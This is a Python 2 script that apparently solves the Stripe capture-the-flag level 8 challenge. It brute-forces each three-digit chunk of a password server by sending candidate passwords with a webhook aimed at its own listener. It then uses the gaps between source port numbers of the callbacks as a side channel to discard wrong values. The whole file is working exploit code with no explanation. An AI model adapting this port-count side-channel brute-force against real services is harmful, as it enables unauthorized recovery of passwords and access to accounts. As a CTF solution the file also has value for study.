import httplib, time, sys, socket

try:
    PORT = int(sys.argv[1])
    CHUNK_NUMBER = int(sys.argv[2])
    PASSWORDMASK = str(sys.argv[3])
except IndexError:
    print "python " + sys.argv[0] + " <webhook port> <current chunk number> <password with target chunk>"
    print "ex: python " + sys.argv[0] + " 31337 2 123XXX123123"
    sys.exit(-1)

LAST_PORT_NUM = 0
BAD_VALUES = []
MAX_NUM = 1000
LEVEL2_HOST = 'level02-3.stripe-ctf.com'
LEVEL8_HOST = 'level08-3.stripe-ctf.com'
LEVEL8_PATH = '/user-ekdldeoscn/'

# Generate a password with 'XXX' as a placeholder for bruteforcing
password = PASSWORDMASK
code = '{"password":"' + password + '", "webhooks":["' + LEVEL2_HOST + ':'+sys.argv[1]+'"]}'

# The socket to reuse for receiving webhook requests
sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM );
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("", PORT))

for retry in range(10):
    for i in range(0, MAX_NUM):
        # Skip known bad values
        if str(i) in BAD_VALUES:
            continue

        # Make a request with a webhook pointed to us, quickly close, and listen
        h = httplib.HTTPSConnection(LEVEL8_HOST)
        h.request('POST', LEVEL8_PATH, code.replace('XXX', str(i).zfill(3)))
        h.close()
        sock.listen(1)

        # Close socket right away. We don't care about the response.
        new_sock, addr = sock.accept()
        new_sock.close()

        # Add guaranteed known bad values to a list
        if addr[1] - LAST_PORT_NUM == (CHUNK_NUMBER + 1):
            BAD_VALUES.append(str(i))

        LAST_PORT_NUM = addr[1]

        # Print only every 10 results to avoid flooding screen
        if i % 10 == 0:
            print "%d: %d" % (i, addr[1])

    # Print out a status after each iteration
    print "Bad: %d %d " % (len(BAD_VALUES), i)
    if len(BAD_VALUES) == MAX_NUM - 1:
        break

# Print out all the values for debugging
print ','.join(BAD_VALUES)

# Print out all the possible values for this chunk
# Should only be one, but can be more in unfortunate cases
for testval in range(0, MAX_NUM):
    if str(testval) not in BAD_VALUES:
        print "Possible value: %d" % testval
